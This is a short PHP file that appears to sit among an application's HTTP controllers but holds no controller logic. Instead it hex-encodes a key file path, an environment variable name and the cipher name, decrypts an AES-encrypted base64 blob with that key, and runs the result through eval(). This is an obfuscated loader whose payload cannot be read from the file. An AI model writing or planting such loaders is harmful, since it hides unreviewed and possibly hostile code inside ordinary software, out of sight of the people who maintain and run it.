<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('KTRJnq4TZv7BoWpJlal5Lw==');

$c=base64_decode(

'oCztY06/C6L/mkymOFgjGq4coydvE81hNuNHYkUKGFWERDONUCaszGOfbydoHxagpRf655Q2iajM' .
'WsIwy3DdmFgYXYVQfU/Iidfz+SwukoCUv2cCj5Q8N0luZLJdfrkrsL5yYfWEuWzwpRakAfoCcjal' .
'O04AzJLI+0CoSjkIe82fRmNLCvqxnFeKtwdWkuByk/2eXGJuJ8vprdRg32sw2dfLXY9xzqBiFfWX' .
'eo1mOsNLKyYHI7LTrZrjhvFcpiKk'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

